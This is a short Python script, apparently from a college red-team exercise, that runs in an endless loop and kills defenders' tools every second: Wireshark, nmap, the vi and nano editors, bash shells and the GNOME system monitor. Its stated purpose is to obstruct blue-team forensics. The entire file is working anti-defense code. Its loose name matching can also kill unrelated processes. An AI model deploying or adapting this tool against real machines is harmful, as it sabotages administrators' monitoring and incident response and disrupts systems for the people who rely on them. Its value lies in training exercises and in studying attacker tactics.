#!/usr/bin/env python3

# Rick Wallert
# Cyber Defense Techniques, Fall 2023
# Team Bravo
# Tool-Prevention

# SPEC: This tool is mostly a nuisance tool.  It is meant to disable blue team tools to make forensics difficult

# Use psutil for process management
import psutil

# Use time for looping
import time

toollist = ["wireshark", "nmap", "vi", "nano", "bash", "gnome-system-mo"]

# Process checking function, check if the process exists and kills it if it does
def process_check(proc_name):
    # Loop over every process in the process list (ps -e)
    for process in psutil.process_iter(['name']):
        # if the process name or information matches a tool within toollist, kill it
        if proc_name in process.info['name'] or process.info['name'] in proc_name:
            process.kill()
            return

# Loop forever
while(True):
    # Run a check every second
    time.sleep(1)

    # Run the process check on every tool
    for tool in toollist:
        process_check(tool)
